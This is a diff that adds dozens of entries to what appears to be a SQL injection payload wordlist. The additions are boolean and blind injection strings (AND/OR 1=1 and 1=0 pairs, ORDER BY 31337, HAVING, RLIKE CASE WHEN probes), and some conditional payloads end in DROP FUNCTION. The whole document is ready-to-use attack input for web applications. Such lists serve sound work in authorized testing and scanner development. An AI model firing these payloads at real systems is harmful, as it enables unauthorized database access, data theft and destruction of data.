@@ -16,16 +16,43 @@
 #
 1') and '1'='1--
 1 or 1=1
+AND 1=0
+AND 1=0-- 
+AND 1=0#
+AND 1083=1083 AND (1427=1427
+AND 1=0 AND '%'='
 and 1=1
 and 1=1--
+AND 1=1
+AND 1=1-- 
+AND 1=1#
+AND 1=1 AND '%'='
+AND 7506=9091 AND (5913=5913
+%' AND 8310=8310 AND '%'='
+%' AND 8310=8311 AND '%'='
 ' and 'one'='one
 ' and 'one'='one--
+ and (select substring(@@version,1,1))='X'
+AS INJECTX WHERE 1=1 AND 1=0
+AS INJECTX WHERE 1=1 AND 1=0--
+AS INJECTX WHERE 1=1 AND 1=0#
+AS INJECTX WHERE 1=1 AND 1=1
+AS INJECTX WHERE 1=1 AND 1=1--
+AS INJECTX WHERE 1=1 AND 1=1#
 CAST('eviware' AS SIGNED INTEGER)
 devnull' or '1
 false
+HAVING 1=0
+HAVING 1=0-- 
+HAVING 1=0#
+HAVING 1=1
+HAVING 1=1-- 
+HAVING 1=1#
 hi' or 1=1 --
 hi" or 1=1 --
 hi" or "a"="a
+IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
+IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
 ' or ''^'
 ' or ''='
 ' or '' '
@@ -52,6 +79,9 @@ or 0=0 #
 ')) or 1--
 " or 1--
 ") or 1--
+OR 1=0
+OR 1=0-- 
+OR 1=0#
 ' or '1'='1
 ' or '1' ='1
 ' or 1=1--
@@ -66,11 +96,22 @@ or 1=1
 or 1=1--
 or 1=1/*
 or 1=1#
+OR 1=1
+OR 1=1-- 
+OR 1=1#
 ' or 1=1 or "='
+OR 3409=3409 AND ('pytW' LIKE 'pytW
+OR 3409=3409 AND ('pytW' LIKE 'pytY
 ' or a=a--
 ') or ('a'='a
 " or "a"="a
 ") or ("a"="a
+ORDER BY 1  
+ORDER BY 1--  
+ORDER BY 1# 
+ORDER BY 31337 
+ORDER BY 31337-- 
+ORDER BY 31337#
 ' or 'one'='one
 ' or 'one'='one--
 ' or true--
@@ -91,6 +132,18 @@ or true--
 " or "x"="x
 ") or ("x")=("x
 ")) or (("x"))=(("x
-' or '1'='1
-' or ''='
+OR x=x
+OR x=x-- 
+OR x=x#
+OR x=y
+OR x=y-- 
+OR x=y#
+RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+WHERE 1=1 AND 1=0
+WHERE 1=1 AND 1=0--
+WHERE 1=1 AND 1=0#
+WHERE 1=1 AND 1=1
+WHERE 1=1 AND 1=1--
+WHERE 1=1 AND 1=1#
 x' or 1=1 or 'x'='y
